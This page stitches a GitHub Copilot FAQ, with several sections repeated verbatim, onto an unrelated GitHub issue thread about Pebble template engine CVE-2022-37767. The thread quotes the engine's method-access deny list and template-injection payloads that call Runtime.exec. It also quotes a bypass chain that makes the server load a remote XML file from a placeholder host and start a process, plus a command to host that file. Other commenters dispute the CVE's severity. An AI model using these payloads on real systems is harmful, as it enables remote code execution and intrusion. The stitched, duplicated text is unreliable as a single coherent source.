#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

| IMHO, using deny lists is an error and pebble should switch to using allow lists instead: the end-user should be responsible of deciding which classes are safe and which are not.  [@ebussieres](https://github.com/ebussieres) WDYT? |

| Disclaimer: I'm just an occasional contributor here  [@chaitu0292](https://github.com/chaitu0292) No, this CVE is not addressed. IMHO, the blacklist approach that was picked cannot possibly cover all possible security leaks and only a whitelist approach where the user explicitly lists what's needed in his templates can work. But maybe I'm missing something.  [@rumfuddle](https://github.com/rumfuddle) Then, corporate users who depend on this library should not stay idle and wait for some open-source volunteers to tackle this issue on their free time. They should contribute, either in manpower or financially. |

| [@rumfuddle](https://github.com/rumfuddle) No it's not just an upgrade of a dependency. You need to define a MethodAccessValidator [implementation](https://github.com/PebbleTemplates/pebble/blob/master/pebble/src/main/java/com/mitchellbosecke/pebble/attributes/methodaccess/MethodAccessValidator.java)  Then If you use pebble-spring:   * Define a bean which implements `MethodAccessValidator`  ```     @Bean     public MethodAccessValidator methodAccessValidator() {       return new BlacklistMethodAccessValidator(); //Provide your custom implementation     }  ```  If not   * override the default MethodAccessValidator in PebbleEngine  ```   new PebbleEngine.Builder()             .methodAccessValidator(new BlacklistMethodAccessValidator()) //Provide your custom implementation             .build();  ```  The complexity resides in the implementation. If we provide a WhitelistMethodAccessValidator, we'll need to whitelist a lot of things (jdk, spring etc.). See this [comment](https://github.com/PebbleTemplates/pebble/pull/494#issuecomment-629691422)  I'm all ears open for suggestions |

| we'll need to whitelist a lot of things (jdk, spring etc.)  jdk  Indeed, core classes and Java collections are often used in pebble templates.  spring  This I don't get, sorry. Why should it be possible for a user to have access **by default** to Spring core classes in his pebble templates? [@ebussieres](https://github.com/ebussieres) Could you please elaborate?  My2cents:  It's possible to harden a default configuration for a known subset of classes, typically the JDK. It's not possible for frameworks such as Spring.  Pebble can provide a sensible default configuration that grants access to all `java.lang` and `java.util` packages, with a few exceptions like `Thread` and `getClass` like it's currently implemented that would have higher priority.  For all other classes and methods, the user would have to explicitly list what he wants to enable, typically his POJOs and utils.  [@ebussieres](https://github.com/ebussieres) WDYT? |

| My apologies for my earlier comment. I only now found the time to look at the issue (I got it confused with a Apache commons vulnerability), and I can see the complexity. For my use case, whitelisting whereby the default whitelist is even empty and the user is required to add "everything" would unblock us but I also appreciate the fact that you need to consider backwards compatibility with the current implementation. And the opposite, blacklisting would not make the CVE go away I guess. |

| And the opposite, blacklisting would not make the CVE go away I guess.  Exactly.  Then, please remember that CVE severity is only determined based on the potential impact if someone was able to exploit it. It doesn't provide any context about the conditions for being able to exploit it. In this case, the only way to exploit is that the templates are generated from an untrusted source, eg having a system that publishes templates in a directory and have the Spring application load them from the filesystem. If your templates are shipped with your application code by your developers, your developers can't do more harm this way than what they can already do with malicious code in their Java code. |

| In our use case, templates are 'data', provided by endusers but at least endusers that have to authenticate and that we trust. So I'm not that worried about exploits. Bigger problem is Nexus. The CVE is level critical, so we cannot perform any build&deploys until this is fixed. |

| Is there any chance this gets resolved any time soon? I am also willing to contribute. As [@rumfuddle](https://github.com/rumfuddle) mentioned, it breaks any corporate build.  To me **this vulnerability would only exhibit itself in scenarios in which the application accepts the input and then directly evaluates it as the template** which is a horribly bad practice.  In the most common case when the templates are managed by the development team the chance of doing any harm is really low. Why would anyone want to execute code from the hand-crafted developer managed template if one could do the same system call directly from the Java code itself. |

| [@slandelle](https://github.com/slandelle) [@ebussieres](https://github.com/ebussieres) I am willing to contribute on behalf of myself or the organization that I am part of if I know that the PR/solution will be accepted into the master.  I suggest to create a `DefaultMethodAccessValidator` or `StrictMethodAccessValidator` that will be active as the default MethodAccessValidator, allowing the template developers to read the properties of the of the template variables `ONLY`.  The user will still be able to configure a backward compatible `BlacklistMethodAccessValidator` either programatically or by setting appropriate Spring Boot starter property.  This should work flawlessly for users who use the view model approach, users who need to execute custom code from the templates will be able to set back the "old" `BlacklistMethodAccessValidator`. This should solve the CVE.  Please let me know what you think. |

In previous versions, in order to mitigate command execution caused by malicious content in the template，pebble introduces a new security mechanism, which is implemented through the class BlacklistMethodAccessValidator.  In this class you can see a lot of restrictions, on the one hand, restricting the class to be an instance of certain classes, and on the other hand, restricting the execution of some methods  ``` public class BlacklistMethodAccessValidator implements MethodAccessValidator {     private static final String[] FORBIDDEN_METHODS = new String[]{"getClass", "wait", "notify", "notifyAll"};      public BlacklistMethodAccessValidator() {     }      public boolean isMethodAccessAllowed(Object object, Method method) {         boolean methodForbidden = object instanceof Class || object instanceof Runtime || object instanceof Thread || object instanceof ThreadGroup || object instanceof System || object instanceof AccessibleObject || this.isUnsafeMethod(method);         return !methodForbidden;     }      private boolean isUnsafeMethod(Method member) {         return this.isAnyOfMethods(member, FORBIDDEN_METHODS);     }      private boolean isAnyOfMethods(Method member, String... methods) {         String[] var3 = methods;         int var4 = methods.length;          for(int var5 = 0; var5 < var4; ++var5) {             String method = var3[var5];             if (this.isMethodWithName(member, method)) {                 return true;             }         }          return false;     }      private boolean isMethodWithName(Method member, String method) {         return member.getName().equals(method);     } } ```  Look at the old version of exploit, loading any class by Class.forName，now，no class  ``` {% set cmd = 'id' %} {% set bytes = (1).TYPE      .forName('java.lang.Runtime')      .methods[6]      .invoke(null,null)      .exec(cmd) %}  ```  What can we do? So far we know that many instances of Spring applications are implicitly registered as beans, so can we find an object from a bean that holds a classloader object, and by getting it we can load any object by executing loadClass  By debugging we can easily export these beans objects  [182612181-b21c98e1-b586-4c02-a0b6-d8c863a76a22](https://user-images.githubusercontent.com/849197/196399256-87e78dd1-276a-40ad-abab-63ada5a180d6.png)  So we have to find some eligible beans among

fit the criteria and it helped us get the classloader object  [182612219-ec75b2f6-77b1-43cd-ab16-4f459aeba184](https://user-images.githubusercontent.com/849197/196399451-420e334a-66f6-4e1b-94f4-e0559e3d6c3e.png)  It is not enough to execute loadclass, we also need to instantiate the class. And It's also very simple, there is jackson among spring's dependencies, through jackson deserialization we can easily instantiate a class.  Fortunately there is this jacksonObjectMapper object in the beans.Now we can instantiate arbitrary classes, and by being able to instantiate arbitrary classes we have bypassed the filtering restrictions  In the spring scenario we can easily think of a configuration class org.springframework.context.support.ClassPathXmlApplicationContext, which allows us to load a remote xml configuration file, through which we can easily implement the command execution.  But...  At this point you will find that any class jackson that inherits from AbstractPointcutAdvisor and AbstractApplicationContext will not be allowed to instantiate  ```     public void validateSubType(DeserializationContext ctxt, JavaType type, BeanDescription beanDesc) throws JsonMappingException {         Class<?> raw = type.getRawClass();         String full = raw.getName();         if (!this._cfgIllegalClassNames.contains(full)) {             if (raw.isInterface()) {                 return;             }              if (full.startsWith("org.springframework.")) {                 Class cls = raw;                  while(true) {                     if (cls == null || cls == Object.class) {                         return;                     }                      String name = cls.getSimpleName();                     if ("AbstractPointcutAdvisor".equals(name) || "AbstractApplicationContext".equals(name)) {                         break;                     }                      cls = cls.getSuperclass();                 }             } else if (!full.startsWith("com.mchange.v2.c3p0.") || !full.endsWith("DataSource")) {                 return;             }         }          ctxt.reportBadTypeDefinition(beanDesc, "Illegal type (%s) to deserialize: prevented for security reasons", new Object[]{full});     } ```  What to do at this time? We found a class called java.beans.Beans in jre.  The instantiate method of this class can help us instantiate arbitrary methods.  ``` public static Object instantiate(ClassLoader cls, String beanName) throws IOException, ClassNotFoundException {   return Beans.instantiate(cls, beanName, null, null); } ```  Here the classloader parameter is allowed to be set to empty, if it is empty later will be through the ClassLoader.getSystemClassLoader (); get, of course, in fact, we also get a classloader at the top which is not the point，It will eventually return an instantiated object based on the beanName passed in.  ``` if (result == null) {   // No serialized object, try just instantiating the class   Class<?> cl;    try {     cl = ClassFinder.findClass(beanName, cls);   } catch (ClassNotFoundException ex) {     // There is no appropriate class.  If we earlier tried to     // deserialize an object and got an IO exception, throw that,     // otherwise rethrow the ClassNotFoundException.     if (serex != null) {       throw serex;     }     throw ex;   }    if (!Modifier.isPublic(cl.getModifiers())) {     throw new ClassNotFoundException("" + cl + " : no public access");   }    /*              * Try to instantiate the class.              */    try {     result = cl.newInstance();   } catch (Exception ex) {     // We have to remap the exception to one in our signature.     // But we pass extra information in the detail message.     throw new ClassNotFoundException("" + cl + " : " + ex, ex);   } } ```  So we get the ClassPathXmlApplicationContext class that was forbidden to be instantiated by indirect means.  So by stringing these points together we can easily get the following payload  ``` {% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %} {% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %} {{ yyy.setConfigLocation("http://xxx.xxx.xxx/1.xml") }} {{ yyy.refresh() }}  ```  1.xml  ``` <?xml version="1.0" encoding="UTF-8" ?>     <beans xmlns="http://www.springframework.org/schema/beans"        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xsi:schemaLocation="      http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">             <constructor-arg >             <list>                 <value>open</value>                 <value>-a</value>                 <value>calculator</value>             </list>             </constructor-arg>         </bean>     </beans> ```  with http server in your vps  ``` python3 -m http.server 80  ```  Successfully triggered command execution by template file called rce.pebble  [182613215-94d98d05-3f5c-4dee-87e4-445dd60c2d2c](https://user-images.githubusercontent.com/849197/196399964-0116ba0f-7e4e-4abb-bf75-28ea2ed13491.png) |

| After reviewing the report [Y4tacker/Web-Security#3](https://github.com/Y4tacker/Web-Security/issues/3) I **STRONGLY** disagree with calling this a Pebble vulnerability. TLTR:  * there must be a badly designed controller allowing the user to load arbitrary template from the classpath * the classpath template must intentionally be designed contain malicious code * **Pebble properly handles and escapes any rendered input variable**  The long story:1. Bad controller design The first problem is in the design of the Spring MVC controller - there is no input validation and the `@RequestParam String template` is being directly used as a template name.  This weakness can be exploited to load and render any classpath resource as a template and it would be a real problem no matter what templating engine is being used. In case of Pebble the list of resources that are eligible to be be loaded is being limited by `pebble.prefix` and `pebble.suffix` files.  On top of being fairy insecure, this approach is likely to cause tons HTTP 500 errors for situations like:   * the mismatched template names (example `you-cant-find-me-on-classpath`) * when trying to load templates that expect certain variables (example: `partials/top`)  ``` package com.example.hackingpebble.controller;  import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam;  @Controller public class Test {      @RequestMapping({"/"})     public String getTemplate(@RequestParam String template) {         // Can be used arbitrary file from the classpath LOL         return template;     }  } ``` 2. Malicous code in the template The second problem is in how the reporter designed `resources/template/rce.pebble` template:  ``` {% set cmd = 'id' %} {% set bytes = (1).TYPE      .forName('java.lang.Runtime')      .methods[6]      .invoke(null,null)      .exec(cmd) %}  ```  This template code is not coming from the user input but is **already present on the classpath**.  Why would a developer try to write a malicious code and hide it in a template if one could simply write a malicious code directly in the Java source? 4. MethodAccessValidator `BlacklistMethodAccessValidator` might not even be there, it is not used in the input validation. For systems that control the template contents (or store them locally on the classpath), as far as I understand, `MethodAccessValidator` is to prevent developers from hurting themself (locking the threads or consuming system resources). 3. Conclusion Calling this a CVE is like saying that knives are dangerous because they can be misused. [CVE-2022-37767](https://github.com/advisories/GHSA-wxx5-w9jc-48wx "CVE-2022-37767") is unlikely to exhibit itself in any application that controls own template contents.  Please consider my previous comment [#625 (comment)](https://github.com/PebbleTemplates/pebble/issues/625#issuecomment-1281187930) as a potential improvement (but not as a *security fix*). |

| [@piotrpolak](https://github.com/piotrpolak) From my understanding:   * Some people design applications where end-users can edit the Pebble templates directly in production, eg served from the database or the filesystem. * CVE risk levels are only based on the possible impact if someone manages to exploit it, not based on the feasibility of exploiting it. See log4j and he LDAP stuff as an example. Here, the impact would be remote code execution, hence the highest possible severity.   I agree that sanitizing the end-user input is the application's responsibility. I also agree that with this kind of reasoning, having a door in your house is a critical vulnerability because you could get robbed if you were to leave it wide open...  But now, it seems that nowadays infosec is all about configuring some dependency scanning SaaS product that's going to report every library matching a CVE in the NVD, whatever the usage context. For example, they force me to upgrade moment.js in a static local files generator because of an issue when used with node.js.  Now, I have no idea how this ended up in the NVD, in particular as AFAIK no one reached out the Pebble community to validate it, and so how to revisit the registired CVE. |

